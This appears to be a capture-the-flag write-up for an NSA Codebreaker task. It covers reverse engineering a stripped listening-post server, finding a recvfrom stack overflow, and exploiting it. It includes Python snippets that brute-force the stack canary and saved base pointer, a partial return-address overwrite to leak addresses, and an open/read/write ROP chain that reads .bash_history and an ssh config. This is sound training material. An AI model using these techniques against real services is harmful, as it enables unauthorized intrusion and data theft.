# NSACC Task 10 Writeup

## Prompt

> NSA worked with FBI to notify all of the identified victims, who in turn notified DC3. Nicely done.

> The final task is to uncover additional information about the actor's infrastructure.

> Gain access to the LP. Provide the IP and port that the psuser account has transmitted data to. What lies behind the listening post?

Categories: Protocol Analysis, Software Development, Exploit Development

Points: 5000

## Solve

### New binary, who dis? 

This challenge starts by exploring the threat actor's listening post. the goal of this operation is to gain access to the `psuser` account, and after poking around at the machine to find any privilege escalation, I determined that chances were very good we would be hacking into the only process that the `psuser` user was running, something called `powershell_lp`. It turns out that this is an implementation of the server side of the malware from Task 4, which is cool continuity to have in a long challenge like this. 

So we are faced with a new binary, and first we run `file` on it.

```sh
powershell_lp: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, for GNU/Linux 3.2.0, BuildID[sha1]=2d839ebf8fe71992878404be06a9f9ad655ec83b, stripped
```

Ugh, it's stripped of all symbols. This will be fun (NOT!). We open it up in Ghidra, and begin the days-long reversing and bug finding exercise. Some things that either increased or decreased this time:

- Using [ApplySig.py](https://github.com/NWMonster/ApplySig) to apply a database of libc signatures to the file ([libc6_2.26-0ubuntu3_amd64.sig](libc6_2.26-0ubuntu3_amd64.sig)) based on the output of `strings` showing the OS this was compiled on. this shortened the reversing time by a whole lot.
- Focusing reverse engineering on control-flow-touched code, not bothering to reverse all functions present in the binary, just those which are executed. This helped steer away from complex functions that are never called from main().
- Mistaking two different implementations of socket `recv()` for one another: Countless hours :(

### The Bug

Finding the bug in this code is the first step to exploiting it. Thankfully we know that there will be a bug, and it's just a matter of finding it. The bug was eventually located in this function that I named `recv()`. It is shown below:

```c
uint recv(int sockfd,char *buf,ulong size,undefined8 x,char *sockaddr,int *sockaddr_len)

{
  int bytes_recvd;
  int *piVar1;
  undefined4 extraout_var;
  uint bytes_recvd_total;
  
  bytes_recvd_total = 0;
  do {
    while( true ) {
      if ((uint)size <= bytes_recvd_total) {
        return bytes_recvd_total;
      }
      piVar1 = nothing_idk();
      *piVar1 = 0;
      bytes_recvd = recvfrom(sockfd,buf + bytes_recvd_total,size & 0xffffffff,0,sockaddr,
                             sockaddr_len);
      if (CONCAT44(extraout_var,bytes_recvd) < 1) break;
      bytes_recvd_total = bytes_recvd_total + bytes_recvd;
    }
    piVar1 = nothing_idk();
  } while (*piVar1 == 4);
  return bytes_recvd_total;
}
```

The bug here is that the `buf` variable is allocated to be 4104 bytes on the stack. This can be overflowed by sending two packets to this server while supplying `size` to be 4096 (the largest allowable). The first packet would be of size 4095, which will result in another call to `recvfrom()` with size still 4096. Sending another large packet (size >9) will cause `recvfrom()` to read off the end of `buf`, causing a buffer overrun. 

### Exploitation

The whole exploit script is present in [exploit.py](exploit.py). First step now that we have a buffer overflow is to inspect the protections on the binary. 

```sh
pwn checksec powershell_lp
	Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found #There is actually canary on certain functions
    NX:       NX enabled
    PIE:      PIE enabled
```

Based on that, we can determine:

- We will need a leak to break PIE
- Probably not GOT overwrite given RELRO
- Stack Canary will require leaking or cracking
- Shellcode on the stack is out as a result of NX

#### Breaking Stack Canary

The first step to make use of this buffer overrun will be to break the stack canary. Given that the program outputs the exit code of the children upon exit, we can determine whether a child failed due to a modified stack canary (code 6) or any other exit code indicating stack canary was correct. We use this to brute force the canary one byte at a time, using this exit code as an oracle to determine whether the byte is correct. That section of the exploit code is as follows:

```py
for y in range(1, 9):
    print(f"\nForcing Canary Byte {y}")

    for x in range(0, 256):
        if connect_send_check(buf2=buf + x.to_bytes(1, "big"), check=0):
            buf += x.to_bytes(1, "big")
            print(f"Working: {buf.hex()}")
            break

print(f"Solved Stack Canary: {buf[-8:].hex()}")
```

#### Brute Forcing `%RBP`

Once we have forced out way past the stack canary, we have to write past `%RBP` to get to the return address, however the program crashes if this value is clobbered, as the stack frame will not restore properly. Therefore, we perform a very similar procedure on the base pointer to ensure that the value that we set it to will result in a successful (exit code 0) outcome. that code is below:

```py
for y in range(1, 9):
    print(f"\nForcing %RBP Byte {y}")

    # try most common values first
    for x in [255, 127] + list(range(256)):
        if connect_send_check(buf2=buf + x.to_bytes(1, "big"), check=0):
            buf += x.to_bytes(1, "big")
            print(f"Working: {buf.hex()}")
            break

print(f"Solved %rbp: {buf[-8:].hex()}")
```

#### Return Address & Leak

Now, we have a valid stack canary and a valid base pointer. The next value to be overwritten is the return address. This cannot just wildly be overwritten, as this will result in a crash, and it cannot be overwritten with a static value as it is randomized with PIE. Therefore, we overwrite the last byte with `0xbe` to jump to a call to `fprintf()` which leaks code addresses, which can be recovered from the logfile. 

```py
connect_send_check(buf2=buf + bytes.fromhex("be"))

with open("../psuser/ps_data.log", "rb") as f:
    x = f.read()

i = 0

stack_leak = u64(x[-134:-126])
code2_leak = u64(x[-102:-94])
code_leak = u64(x[-6:] + i.to_bytes(2, "big"))

# calculate offsets

stack = stack_leak - 0x1F950
code2 = code2_leak - 0x5C40
code = code_leak - 0x6D4A9
```

#### It's ROPping Time! 

Now, we have all the ingredients that we need to perform ROP. I chose to use an `open()`, `read()`, `write()` ROP payload, which is assembled using the perfect gadgets provided in this massive binary. In pseudocode, this is what our ROP does:

```
str = &write_to_scratch_space("/home/psuser/.bash_history\x00")
open(str, 0, 0)
read(5, str, 0x1000) // we know that the fd will be 5, as the logfile is fd 3 and the data file is fd 4
write(3, str, 0x1000)
```

This dumps the file contents to the logfile, and we indeed see the contents of the `.bash_history`:

```
...
man scp
scp -P 28222 ~/ps_data.log nexthop:
```

This step is repeated to print the ssh config in order to fully solve task 10:

```
Host nexthop
    Hostname: 10.62.55.52
    User: user
    IdentityFile: /home/psuser/.ssh/id_rsa
```